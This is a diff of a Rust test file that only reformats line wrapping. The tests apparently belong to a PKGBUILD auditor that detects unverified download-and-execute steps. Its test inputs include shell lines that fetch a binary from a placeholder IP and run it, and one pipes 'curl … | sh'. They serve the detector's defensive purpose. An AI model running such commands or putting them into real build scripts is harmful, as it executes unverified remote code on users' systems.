@@ -19,19 +19,25 @@ fn laws_table() {
         ),
         (
             "download then run through a variable",
-            pkg("build() { u=http://203.0.113.9/x; curl -o /tmp/a \"$u\"; chmod +x /tmp/a; /tmp/a; }"),
+            pkg(
+                "build() { u=http://203.0.113.9/x; curl -o /tmp/a \"$u\"; chmod +x /tmp/a; /tmp/a; }",
+            ),
             None,
             &[LawId::FetchExecuteUnverified],
         ),
         (
             "checksum before running clears the law",
-            pkg("build() { curl -o a.sh http://example.org/a.sh; echo \"abc  a.sh\" | sha256sum -c; sh a.sh; }"),
+            pkg(
+                "build() { curl -o a.sh http://example.org/a.sh; echo \"abc  a.sh\" | sha256sum -c; sh a.sh; }",
+            ),
             None,
             &[],
         ),
         (
             "checksum after running does not",
-            pkg("build() { curl -o a.sh http://example.org/a.sh; sh a.sh; echo \"abc  a.sh\" | sha256sum -c; }"),
+            pkg(
+                "build() { curl -o a.sh http://example.org/a.sh; sh a.sh; echo \"abc  a.sh\" | sha256sum -c; }",
+            ),
             None,
             &[LawId::FetchExecuteUnverified],
         ),
@@ -67,7 +73,9 @@ fn laws_table() {
         ),
         (
             "a plain build is quiet",
-            pkg("source=(https://example.org/demo-1.0.tar.gz)\nsha256sums=(0000000000000000000000000000000000000000000000000000000000000000)\nbuild() { cd demo-$pkgver; ./configure --prefix=/usr; make; }\npackage() { cd demo-$pkgver; make DESTDIR=\"$pkgdir\" install; }"),
+            pkg(
+                "source=(https://example.org/demo-1.0.tar.gz)\nsha256sums=(0000000000000000000000000000000000000000000000000000000000000000)\nbuild() { cd demo-$pkgver; ./configure --prefix=/usr; make; }\npackage() { cd demo-$pkgver; make DESTDIR=\"$pkgdir\" install; }",
+            ),
             None,
             &[],
         ),
@@ -89,10 +97,17 @@ fn laws_table() {
 
 #[test]
 fn a_finding_is_one_sentence_with_file_and_line() {
-    let r = audit_text(&pkg("build() {\n  curl -s http://203.0.113.9/x | sh\n}"), None);
+    let r = audit_text(
+        &pkg("build() {\n  curl -s http://203.0.113.9/x | sh\n}"),
+        None,
+    );
     let f = &r.findings[0];
     assert!(f.sentence.contains("PKGBUILD:7"), "{}", f.sentence);
-    assert!(f.sentence.contains("http://203.0.113.9/x"), "{}", f.sentence);
+    assert!(
+        f.sentence.contains("http://203.0.113.9/x"),
+        "{}",
+        f.sentence
+    );
     assert!(!f.sentence.contains('\n'), "{}", f.sentence);
 }
 
